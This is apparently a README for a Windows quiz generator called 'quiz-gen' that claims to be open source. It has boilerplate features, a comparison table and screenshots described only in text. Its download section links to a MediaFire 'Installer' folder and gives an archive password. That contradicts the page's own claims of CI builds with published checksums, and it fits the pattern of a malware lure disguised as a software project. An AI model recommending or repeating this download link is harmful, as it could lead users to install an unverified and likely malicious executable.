# quiz-gen

❓ Free, open-source quiz generator for Windows — build printable tests with answer keys from notes via local LLM. 100 MB portable, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Multiple formats** — multiple choice, true-false, short answer and fill-the-blank from the same source text
- ✅ **Difficulty dial** — recall-level questions or tricky application ones, chosen per generation run
- ✅ **Answer keys** — instructor copy with keys and explanations generated beside the clean student copy
- ✅ **Print-ready layout** — HTML and PDF-style output with real spacing, not a wall of text
- ✅ **Retake variants** — same material, different questions, so week two classes get a fresh test
- ✅ **Topic tagging** — questions labeled by source section for targeted revision sheets
- ✅ **100 MB self-contained exe** — runtime bundled, model runs locally via llama.cpp, offline, MIT

## Why quiz-gen

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **quiz-gen** | ChatGPT web | Quizizz | Questgen |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free tier | Free tiers | Paid |
| Open source | **Yes** | No | No | No
| Source text stays local | **Yes** | Upload | Upload | Upload
| Printable student and key copies | **Yes** | Manual | Platform only | Partial
| Retake variants | **Yes** | Manual | Platform | No
| Portable, no install | **Yes, 100 MB** | Browser | Browser | Browser

## FAQ

**how to generate printable quizzes with answer keys from my lecture notes?**

Chatbots produce questions in chat formatting that then needs an hour of massaging before printing, and platform tools keep everything inside their website. quiz-gen generates four question formats locally and outputs clean student and instructor copies. It is a 100 MB portable exe, MIT, offline.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark classroom (#121417, blue #4F46E5): source notes left, question draft list right with type badges, difficulty dial at exam level, generate button lit.
2. Review pass: question card center with edit fields, distractor quality note, tag dropdown reading chapter 3, counter chip 18 of 25 kept.
3. Print preview: student copy page left, instructor key right with answers and explanations, retake variant button, export dropdown set to print HTML.

## Download

| Source | Link |
|---|---|
| 💾 **Installer quiz-gen** | [Installer quiz-gen](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).